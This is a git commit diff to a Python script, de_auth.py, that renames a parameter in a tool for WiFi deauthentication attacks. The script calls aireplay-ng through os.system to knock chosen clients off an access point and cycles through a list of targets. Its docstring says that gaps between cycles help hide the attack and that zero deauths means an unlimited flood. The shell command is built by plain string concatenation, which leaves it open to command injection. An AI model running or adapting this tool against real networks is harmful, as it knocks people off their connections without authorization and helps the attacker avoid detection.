38a5448d17206f4be1070269599adcb42cd5223f
pablo <pablo0168@hotmail.com>
2017-11-17 00:31:32 -0600

    re worded variable name

--- de_auth.py
+++ de_auth.py
@@ -3,11 +3,11 @@ from datetime import datetime
 import time
 def de_auth_client( client_mac,
                     access_point_mac,
-                    num_packets = 1,
+                    deauths = 1,
                     adapter="wlan0mon"):
 
     # fast but no stdout/err
-    r = os.system("aireplay-ng " + "-0 " + str(num_packets) + " -a " + str(access_point_mac) \
+    r = os.system("aireplay-ng " + "-0 " + str(deauths) + " -a " + str(access_point_mac) \
               + " -c " + client_mac + " " + adapter)
 
     """
@@ -21,15 +21,16 @@ def de_auth_client( client_mac,
     return r
 
 def attack_clients(clients_dict,
-                   packets_per_client,
+                   deauths_per_client,
                    adapter,
                    timeout=60,
                    list_cycles=100,
                    time_between_cycles = 1
                    ):
     """ At this point it we know exactly who are we attacking
-        - packets_per_client (int) doesn't necessarily have to large if
-        cycling a list of clients is fast enough
+        - deauths (int) doesn't necessarily have to be large if
+        cycling a list of clients is fast enough. Also note that 1 deauth = 128 packets
+        Passing this option as zero makes it unlimited deauths
         - time_between_cycles (int seconds) can help obscure the attack
         - timeout, list_cycles (int) determine for how long should the attack run
     """
@@ -43,7 +44,7 @@ def attack_clients(clients_dict,
         count += 1
         de_auth_client(client["client_mac"],
                        client["ap_mac"],
-                       num_packets=packets_per_client,
+                       deauths=deauths_per_client,
                        adapter=adapter)
         TIME_DIFF = datetime.now() - CURR_TIME
     return 0
